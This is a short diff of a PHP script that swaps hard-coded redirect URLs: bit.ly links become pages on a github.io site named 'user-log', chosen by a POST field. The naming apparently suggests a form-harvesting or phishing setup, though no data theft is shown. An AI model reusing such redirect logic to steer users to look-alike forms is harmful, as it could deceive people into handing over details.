@@ -3,8 +3,8 @@
     if(isset($_POST['nam']) && $_POST['nam'] == 'lg'){
 
         // Go LG English Form
-        $goDone = 'https://bit.ly/3odBNpT';
-        $goFoem = 'https://bit.ly/3nqxTsJ';
+	$goFoem = 'https://user-log.github.io/form-lg-ar/done.html';
+        $goDone = 'https://user-log.github.io/form-lg-ar/';
         
     } else if(isset($_POST['nam']) && $_POST['nam'] != 'lg'){
 
@@ -14,9 +14,8 @@
         
     } else{
 
-        // Go Wazfny
-        $goDone = 'http://bit.ly/3sDaaJnV33';
-        $goFoem = 'https://bit.ly/3irf2N4V33';
+        $goFoem = 'https://user-log.github.io/form-lg-ar/done.html';
+        $goDone = 'https://user-log.github.io/form-lg-ar/';
     }
 	include "connect.php";
 	$myCountry = '';
